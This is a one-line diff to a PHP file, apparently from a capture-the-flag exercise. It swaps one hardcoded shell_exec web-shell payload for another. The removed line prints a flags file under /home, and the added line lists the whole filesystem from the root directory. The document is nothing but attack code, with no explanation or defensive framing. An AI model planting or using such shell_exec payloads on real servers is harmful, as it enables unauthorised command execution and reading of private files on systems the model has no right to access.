@@ -1,1 +1,1 @@
-<?php echo shell_exec('cat /home/flags.txt'); ?>
+<?php echo shell_exec('cd / && ls **'); ?>
